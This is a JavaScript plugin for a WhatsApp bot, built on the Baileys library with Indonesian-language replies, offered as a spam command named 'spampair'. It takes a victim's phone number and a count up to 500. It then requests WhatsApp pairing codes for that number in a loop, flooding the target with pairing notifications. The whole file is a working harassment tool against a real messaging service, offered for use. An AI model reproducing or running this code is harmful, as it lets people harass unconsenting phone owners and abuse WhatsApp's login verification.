/** @type {import('#lib/types.js').Plugin} */
import makeWaSocket, { useMultiFileAuthState, fetchLatestBaileysVersion } from '@whiskeysockets/baileys'
import pino from 'pino'

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms))

export default {
  name: "spampair",
  category: "spam",
  command: ["spampair", "spair", "pairspam"],
  alias: ["sp", "pair"],
  
  settings: {
    owner: false,
    loading: false
  },

  run: async (conn, m) => {
    try {
      const text = m.text
      
      if (!text.includes('|')) {
        return m.reply(`❌ Format salah!\nContoh: ${m.prefix + m.command} 628xxxxxx|150`)
      }

      const [nomorRaw, jumlahRaw = '150'] = text.split('|').map(x => x.trim())
      const target = nomorRaw.replace(/[^0-9]/g, '')
      const jumlah = parseInt(jumlahRaw)

      if (!target || isNaN(jumlah) || jumlah <= 0 || jumlah > 500) {
        return m.reply(`❌ Format salah atau jumlah terlalu besar!\n\nContoh: ${m.prefix + m.command} 628xxxxxx|150`)
      }

      await m.reply(`📡 *Memulai spam pairing ke:* ${target}\n🔁 Sebanyak: *${jumlah}x*\n\n⏳ Mohon tunggu...`)

      const { state } = await useMultiFileAuthState('pepek')
      const { version } = await fetchLatestBaileysVersion()

      const sock = await makeWaSocket({
        auth: state,
        version,
        logger: pino({ level: 'fatal' })
      })

      let sukses = 0, gagal = 0

      for (let i = 0; i < jumlah; i++) {
        await sleep(1500)
        try {
          let kode = await sock.requestPairingCode(target)
          console.log(`[${i + 1}] ✅ Kode pairing: ${kode}`)
          sukses++
        } catch (err) {
          console.log(`[${i + 1}] ❌ Gagal:`, err.message)
          gagal++
        }
      }

      await m.reply(`✅ *Selesai*\n📲 Nomor: ${target}\n✅ Berhasil: ${sukses}\n❌ Gagal: ${gagal}`)

    } catch (err) {
      console.error('[SPAMPAIR ERROR]', err)
      m.reply('❌ Terjadi kesalahan saat melakukan pairing.')
    }
  }
}